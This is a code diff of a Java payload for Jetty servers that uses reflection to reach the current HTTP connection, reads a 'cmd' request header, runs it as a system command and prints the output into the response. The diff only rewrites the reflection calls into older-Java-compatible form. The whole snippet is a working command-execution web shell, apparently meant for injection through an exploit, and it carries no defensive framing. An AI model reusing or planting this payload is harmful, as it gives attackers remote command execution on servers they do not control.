@@ -10,7 +10,8 @@
     obj = field.get(obj);
 
     Object[] obj_arr = (Object[]) obj;
-    for(Object o : obj_arr){
+    for(int i = 0; i < obj_arr.length; i++){
+        Object o = obj_arr[i];
         if(o == null) continue;
 
         field = o.getClass().getDeclaredField("value");
@@ -19,35 +20,35 @@
 
         if(obj != null && obj.getClass().getName().endsWith("AsyncHttpConnection")){
             Object connection = obj;
-            java.lang.reflect.Method method = connection.getClass().getMethod("getRequest");
-            obj = method.invoke(connection);
+            java.lang.reflect.Method method = connection.getClass().getMethod("getRequest", null);
+            obj = method.invoke(connection, null);
 
-            method = obj.getClass().getMethod("getHeader", String.class);
-            obj = method.invoke(obj, "cmd");
+            method = obj.getClass().getMethod("getHeader", new Class[]{String.class});
+            obj = method.invoke(obj, new Object[]{"cmd"});
 
             String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();
 
-            method = connection.getClass().getMethod("getPrintWriter", String.class);
-            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, "utf-8");
+            method = connection.getClass().getMethod("getPrintWriter", new Class[]{String.class});
+            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, new Object[]{"utf-8"});
             printWriter.println(res);
 
         }else if(obj != null && obj.getClass().getName().endsWith("HttpConnection")){
-            java.lang.reflect.Method method = obj.getClass().getDeclaredMethod("getHttpChannel");
-            Object httpChannel = method.invoke(obj);
+            java.lang.reflect.Method method = obj.getClass().getDeclaredMethod("getHttpChannel", null);
+            Object httpChannel = method.invoke(obj, null);
 
-            method = httpChannel.getClass().getMethod("getRequest");
-            obj = method.invoke(httpChannel);
+            method = httpChannel.getClass().getMethod("getRequest", null);
+            obj = method.invoke(httpChannel, null);
 
-            method = obj.getClass().getMethod("getHeader", String.class);
-            obj = method.invoke(obj, "cmd");
+            method = obj.getClass().getMethod("getHeader", new Class[]{String.class});
+            obj = method.invoke(obj, new Object[]{"cmd"});
 
             String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();
 
-            method = httpChannel.getClass().getMethod("getResponse");
-            obj = method.invoke(httpChannel);
+            method = httpChannel.getClass().getMethod("getResponse", null);
+            obj = method.invoke(httpChannel, null);
 
-            method = obj.getClass().getMethod("getWriter");
-            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj);
+            method = obj.getClass().getMethod("getWriter", null);
+            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);
             printWriter.println(res);
         }
     }
